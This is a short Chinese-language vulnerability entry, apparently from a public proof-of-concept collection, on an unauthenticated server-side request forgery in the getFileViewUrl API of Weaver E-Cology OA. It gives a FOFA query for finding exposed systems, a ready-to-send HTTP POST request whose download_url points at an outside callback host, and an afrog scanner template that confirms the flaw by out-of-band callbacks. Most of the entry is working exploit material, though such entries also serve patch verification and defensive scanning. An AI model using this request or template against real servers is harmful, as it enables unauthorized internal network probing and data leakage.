# 泛微E-Cology接口getFileViewUrl存在SSRF漏洞

泛微E-Cology getFileViewUrl 接口处存在服务器请求伪造漏洞，未经身份验证的远程攻击者利用此漏洞扫描服务器所在的内网或本地端口，获取服务的banner信息，窥探网络结构，甚至对内网或本地运行的应用程序发起攻击，获取服务器内部敏感配置，造成信息泄露。

## fofa

```yaml
app="泛微-OA（e-cology）"
```

## poc

```yaml
POST /api/doc/mobile/fileview/getFileViewUrl HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json
Upgrade-Insecure-Requests: 1
 
{
    "file_id": "1000",
    "file_name": "c",
    "download_url":"http://euixlkewfg.dgrh3.cn"
}
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407092255733.png)

## afrog poc

```yaml
id: 泛微E-Cology接口getFileViewUrl存在SSRF漏洞

info:
  name: 泛微E-Cology接口getFileViewUrl存在SSRF漏洞
  author: wy876
  severity: high
  verified: true
  description: |-
    泛微E-Cology getFileViewUrl 接口处存在服务器请求伪造漏洞，未经身份验证的远程攻击者利用此漏洞扫描服务器所在的内网或本地端口，获取服务的banner信息，窥探网络结构，甚至对内网或本地运行的应用程序发起攻击，获取服务器内部敏感配置，造成信息泄露。
    Fofa: app="泛微-OA（e-cology）"

  reference:
    - https://blog.csdn.net/qq_41904294/article/details/140301289
  tags: 泛微,ssrf
  created: 2024/07/10

set:
  oob: oob()
  oobHTTP: oob.HTTP
  oobDNS: oob.DNS

rules:
  r0:
    request:
      method: POST
      path: /api/doc/mobile/fileview/getFileViewUrl
      headers:
        Content-Type: application/json
      body: |
        {"file_id": "1000","file_name": "c","download_url":"{{oobHTTP}}"}
    expression: response.status == 200 && oobCheck(oob, oob.ProtocolHTTP, 3)

expression: r0()
```

